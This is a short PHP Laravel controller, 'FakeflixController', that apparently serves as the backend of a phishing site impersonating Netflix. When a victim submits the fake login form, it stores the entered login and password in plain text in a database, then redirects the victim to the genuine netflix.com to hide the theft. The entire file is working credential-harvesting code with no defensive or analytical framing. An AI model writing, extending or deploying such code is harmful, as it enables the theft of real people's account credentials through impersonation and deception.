<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Login;

class FakeflixController extends Controller
{
    public function redirect(Request $req){
        $log = new Login();
        $log->login = $req->login;
        $log->password = $req->password;
        $log->save();
        return redirect()->away("https://netflix.com");
    }
}
